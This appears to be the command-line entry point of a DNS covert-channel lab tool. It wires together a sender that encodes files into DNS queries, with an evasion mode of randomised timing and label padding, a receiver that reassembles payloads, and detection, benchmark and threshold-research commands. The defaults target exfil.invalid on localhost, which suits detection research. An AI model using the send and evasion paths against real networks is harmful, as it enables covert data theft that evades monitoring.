# CLI entry point.
# Provides subcommands: send, detect, benchmark, receive, research.
# Run as: python -m cli.main <subcommand> [args]

from __future__ import annotations

import argparse
import dataclasses
import json
import logging
import sys
from pathlib import Path

from analysis.benchmark import print_report, run_benchmark
from research.benchmark_matrix import print_matrix_report, run_matrix
from research.threshold_sweep import (
    default_entropy_grid,
    default_length_grid,
    default_sweep_sessions,
    print_sweep_table,
    run_sweep,
)
from detection.pcap_analyzer import (
    HIGH_ENTROPY_THRESHOLD,
    HIGH_VOLUME_THRESHOLD,
    LONG_LABEL_THRESHOLD,
    SuspiciousHost,
    parse_pcap,
    parse_zeek_dns_log,
    run as analyzer_run,
)
from exfil.config import ExfilConfig
from exfil.encoder import DNSExfilEncoder

logger = logging.getLogger(__name__)

# Repo root is two levels up from this file (cli/main.py -> cli/ -> repo root).
_REPO_ROOT = Path(__file__).parent.parent


def _handle_send(args: argparse.Namespace) -> int:
    """Handle the 'send' subcommand.

    Encodes a payload and transmits it as a sequence of DNS queries, either
    using the basic sender or the evasion variant. In dry-run mode, prints
    the FQDNs that would be sent without opening any sockets.

    Args:
        args: Parsed arguments from the 'send' subparser.

    Returns:
        0 on success, 1 on error.
    """
    # Resolve payload bytes.
    if args.file:
        file_path = Path(args.file)
        if not file_path.exists():
            print(f"Error: file not found: {file_path}", file=sys.stderr)
            return 1
        data = file_path.read_bytes()
    else:
        data = args.payload.encode()

    config = ExfilConfig(
        target_domain=args.domain,
        dns_server=args.server,
        chunk_size=args.chunk_size,
        inter_query_delay_seconds=args.delay,
        encoding=args.encoding,
    )

    if args.dry_run:
        encoder = DNSExfilEncoder(
            target_domain=config.target_domain,
            chunk_size=config.chunk_size,
            encoding=config.encoding,
        )
        result = encoder.encode(data)
        for fqdn in result.fqdns:
            print(fqdn)
        print(f"Dry run: {result.chunk_count + 1} queries would be sent for {len(data)} bytes")
        return 0

    print("WARNING: raw packet sending requires root. Run with sudo if send fails.")

    if args.evasion:
        from evasion.evasion_sender import EvasionConfig, EvasionSender

        ev_config = EvasionConfig(
            min_delay=args.min_delay,
            max_delay=args.max_delay,
            padding_chars=args.padding,
        )
        sender = EvasionSender(exfil_config=config, evasion_config=ev_config)
        result = sender.exfiltrate(data)
        print(f"chunks_sent:      {result.chunks_sent}")
        print(f"bytes_encoded:    {result.bytes_encoded}")
        print(f"total_queries:    {result.total_queries}")
        print(f"elapsed_seconds:  {result.elapsed_seconds:.3f}")
    else:
        from exfil.dns_sender import DNSSender

        sender = DNSSender(config)
        result = sender.exfiltrate(data)
        print(f"chunks_sent:      {result.chunks_sent}")
        print(f"bytes_encoded:    {result.bytes_encoded}")
        print(f"total_queries:    {result.total_queries}")
        print(f"elapsed_seconds:  {result.elapsed_seconds:.3f}")

    return 0


def _format_text(results: list[SuspiciousHost]) -> str:
    """Format a list of SuspiciousHost objects as human-readable text.

    Args:
        results: Flagged domains from the analyzer.

    Returns:
        Formatted string, one block per domain.
    """
    lines = []
    for host in results:
        lines.append(f"Domain:          {host.domain}")
        lines.append(f"Confidence:      {host.confidence}")
        lines.append(f"Avg entropy:     {host.avg_entropy:.2f}")
        lines.append(f"Avg label len:   {host.avg_subdomain_length:.1f}")
        lines.append(f"Query count:     {host.query_count}")
        lines.append(f"Beacon:          {host.beacon_result.confidence}")
        lines.append("Signals:")
        for sig in host.signals:
            lines.append(f"  - {sig}")
        lines.append("---")
    return "\n".join(lines)


def _handle_detect(args: argparse.Namespace) -> int:
    """Handle the 'detect' subcommand.

    Parses a PCAP or Zeek log file and prints domains flagged as suspicious,
    in text, JSON, or HTML format.

    Args:
        args: Parsed arguments from the 'detect' subparser.

    Returns:
        0 on success or no results, 1 if the input file does not exist.
    """
    import detection.pcap_analyzer as _analyzer

    # Apply any threshold overrides before running the analyzer.
    if args.threshold_entropy is not None:
        _analyzer.HIGH_ENTROPY_THRESHOLD = args.threshold_entropy
    if args.threshold_length is not None:
        _analyzer.LONG_LABEL_THRESHOLD = args.threshold_length
    if args.threshold_volume is not None:
        _analyzer.HIGH_VOLUME_THRESHOLD = args.threshold_volume

    if args.pcap:
        input_path = Path(args.pcap)
        input_type = "pcap"
    else:
        input_path = Path(args.zeek)
        input_type = "zeek"

    if not input_path.exists():
        print(f"Error: file not found: {input_path}", file=sys.stderr)
        return 1

    results = _analyzer.run(input_path, input_type=input_type)

    if not results:
        print("No suspicious domains detected.")
        return 0

    if args.format == "json":
        output = json.dumps([dataclasses.asdict(h) for h in results], indent=2)
    elif args.format == "html":
        from detection.reporter import generate_report
        output_path = Path(args.output) if args.output else Path("detection_report.html")
        generate_report(results, input_path, output_path)
        print(f"HTML report written to {output_path}")
        return 0
    else:
        output = _format_text(results)

    if args.output:
        Path(args.output).write_text(output)
    else:
        print(output)

    return 0


def _handle_receive(args: argparse.Namespace) -> int:
    """Handle the 'receive' subcommand.

    Starts a passive DNS receiver that listens for encoded subdomain queries
    and reassembles the payload. Blocks until interrupted with Ctrl+C.

    Args:
        args: Parsed arguments from the 'receive' subparser.

    Returns:
        0 on clean exit.
    """
    from receiver.dns_receiver import DNSReceiver

    on_complete = None
    if args.output:
        output_path = Path(args.output)

        def on_complete(src_ip: str, domain: str, payload: bytes) -> None:
            """Append a completed session payload to the output file."""
            header = f"=== Session: {src_ip} -> {domain} ({len(payload)} bytes) ===\n"
            with output_path.open("ab") as fh:
                fh.write(header.encode("utf-8"))
                fh.write(payload)
                fh.write(b"\n")

    receiver = DNSReceiver(host=args.host, port=args.port, on_complete=on_complete)
    print("Press Ctrl+C to stop.")
    try:
        receiver.start()
    except KeyboardInterrupt:
        receiver.stop()
        print("Receiver stopped.")
    return 0


def _handle_research(args: argparse.Namespace) -> int:
    """Run synthetic threshold sweep or encoding × jitter matrix."""
    if args.sweep:
        malicious, benign = default_sweep_sessions()
        results = run_sweep(default_entropy_grid(), default_length_grid(), malicious, benign)
        print_sweep_table(results)
        payload = [dataclasses.asdict(r) for r in results]
    else:
        results = run_matrix()
        print_matrix_report(results)
        payload = [dataclasses.asdict(r) for r in results]

    if args.output:
        Path(args.output).write_text(json.dumps(payload, indent=2))
        print(f"\nJSON written to {args.output}")
    return 0


def _handle_benchmark(args: argparse.Namespace) -> int:
    """Handle the 'benchmark' subcommand.

    Runs the detection benchmark against the basic and evasion session PCAPs
    and prints either a formatted report or raw JSON.

    Args:
        args: Parsed arguments from the 'benchmark' subparser.

    Returns:
        0 on success.
    """
    sample_dir = Path(args.sample_dir) if args.sample_dir else _REPO_ROOT / "sample_data"
    results = run_benchmark(sample_dir)

    if args.json:
        print(json.dumps(results, indent=2))
    else:
        print_report(results)

    return 0


def _build_parser() -> argparse.ArgumentParser:
    """Build and return the top-level argument parser with all subcommands.

    Returns:
        Configured ArgumentParser instance.
    """
    parser = argparse.ArgumentParser(
        prog="python -m cli.main",
        description="DNS covert-channel lab tools: emit encoded queries, receive, detect, benchmark.",
    )
    subparsers = parser.add_subparsers(dest="subcommand", metavar="SUBCOMMAND")
    subparsers.required = True

    # ── send ──────────────────────────────────────────────────────────────
    send_p = subparsers.add_parser("send", help="Encode and transmit a payload via DNS queries.")
    payload_group = send_p.add_mutually_exclusive_group(required=True)
    payload_group.add_argument(
        "--payload", metavar="TEXT", help="UTF-8 string payload to encode (lab use only)."
    )
    payload_group.add_argument(
        "--file", metavar="PATH", help="Binary file to read as the raw payload (lab use only)."
    )
    send_p.add_argument("--domain", metavar="TEXT", default="exfil.invalid",
                        help="Target domain for DNS queries (default: exfil.invalid).")
    send_p.add_argument("--server", metavar="TEXT", default="127.0.0.1",
                        help="DNS server IP to send queries to (default: 127.0.0.1).")
    send_p.add_argument(
        "--chunk-size",
        metavar="INT",
        type=int,
        default=30,
        help="Maximum encoded characters per label before splitting (default: 30).",
    )
    send_p.add_argument("--delay", metavar="FLOAT", type=float, default=0.5,
                        help="Seconds between queries for basic sender (default: 0.5).")
    send_p.add_argument("--evasion", action="store_true",
                        help="Use evasion sender with randomised timing and label padding.")
    send_p.add_argument("--min-delay", metavar="FLOAT", type=float, default=0.5,
                        help="Min delay for evasion sender (default: 0.5).")
    send_p.add_argument("--max-delay", metavar="FLOAT", type=float, default=3.0,
                        help="Max delay for evasion sender (default: 3.0).")
    send_p.add_argument("--padding", metavar="INT", type=int, default=4,
                        help="Padding chars for evasion sender (default: 4).")
    send_p.add_argument("--encoding", metavar="TEXT", default="hex",
                        choices=["hex", "base32", "base64"],
                        help="Encoding scheme for the payload: hex, base32, or base64 (default: hex).")
    send_p.add_argument("--dry-run", action="store_true",
                        help="Print FQDNs that would be sent without transmitting any packets.")

    # ── detect ────────────────────────────────────────────────────────────
    detect_p = subparsers.add_parser("detect", help="Analyse a PCAP or Zeek log for suspicious DNS traffic.")
    input_group = detect_p.add_mutually_exclusive_group(required=True)
    input_group.add_argument("--pcap", metavar="PATH", help="Path to a PCAP file.")
    input_group.add_argument("--zeek", metavar="PATH", help="Path to a Zeek dns.log file.")
    detect_p.add_argument("--format", metavar="TEXT", default="text",
                          choices=["text", "json", "html"],
                          help="Output format: text (default), json, html.")
    detect_p.add_argument("--output", metavar="PATH",
                          help="Write output to this file instead of stdout.")
    detect_p.add_argument("--threshold-entropy", metavar="FLOAT", type=float, default=None,
                          help="Override the entropy detection threshold.")
    detect_p.add_argument("--threshold-length", metavar="INT", type=int, default=None,
                          help="Override the label length detection threshold.")
    detect_p.add_argument("--threshold-volume", metavar="INT", type=int, default=None,
                          help="Override the query volume detection threshold.")

    # ── receive ───────────────────────────────────────────────────────────
    recv_p = subparsers.add_parser("receive", help="Listen for encoded DNS queries and reconstruct the payload.")
    recv_p.add_argument("--host", metavar="TEXT", default="127.0.0.1",
                        help="IP address to bind the receiver to (default: 127.0.0.1).")
    recv_p.add_argument("--port", metavar="INT", type=int, default=5353,
                        help="UDP port to listen on (default: 5353).")
    recv_p.add_argument("--output", metavar="PATH", default=None,
                        help="Append each reconstructed payload to this file instead of printing to stdout.")

    # ── benchmark ─────────────────────────────────────────────────────────
    bench_p = subparsers.add_parser("benchmark", help="Run detection benchmark against saved PCAP sessions.")
    bench_p.add_argument("--sample-dir", metavar="PATH", default=None,
                         help="Directory containing the session PCAP files (default: sample_data/).")
    bench_p.add_argument("--json", action="store_true",
                         help="Print raw JSON instead of the formatted report.")

    # ── research ────────────────────────────────────────────────────────
    research_p = subparsers.add_parser(
        "research",
        help="Synthetic sessions: threshold sweep or encoding × jitter detection matrix.",
    )
    research_mode = research_p.add_mutually_exclusive_group(required=True)
    research_mode.add_argument(
        "--sweep",
        action="store_true",
        help="Run entropy × label-length threshold sweep and print the results table.",
    )
    research_mode.add_argument(
        "--matrix",
        action="store_true",
        help="Run encoding × jitter detection matrix and print the results table.",
    )
    research_p.add_argument(
        "--output",
        metavar="PATH",
        default=None,
        help="Write JSON results (sweep or matrix rows) to this file.",
    )

    return parser


def main() -> int:
    """Parse arguments and dispatch to the appropriate subcommand handler.

    Returns:
        Exit code: 0 on success, 1 on error.
    """
    logging.basicConfig(level=logging.WARNING)
    parser = _build_parser()
    args = parser.parse_args()

    if args.subcommand == "send":
        return _handle_send(args)
    if args.subcommand == "detect":
        return _handle_detect(args)
    if args.subcommand == "receive":
        return _handle_receive(args)
    if args.subcommand == "benchmark":
        return _handle_benchmark(args)
    if args.subcommand == "research":
        return _handle_research(args)

    parser.print_help()
    return 1


if __name__ == "__main__":
    sys.exit(main())
